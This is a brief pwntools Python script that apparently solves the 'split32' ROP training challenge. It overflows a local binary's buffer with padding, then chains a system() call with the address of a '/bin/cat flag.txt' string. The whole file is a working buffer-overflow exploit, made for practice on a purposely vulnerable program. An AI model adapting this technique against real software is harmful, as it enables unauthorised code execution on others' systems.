from pwn import *

elf = ELF('./split32')
p = process(elf.path)

system_call = p32(0x0804861a)
command = p32(0x804a030)    #bin/cat flag.txt
rop = b'a'*0x2c + system_call + command
p.sendline(rop)

print(p.readall())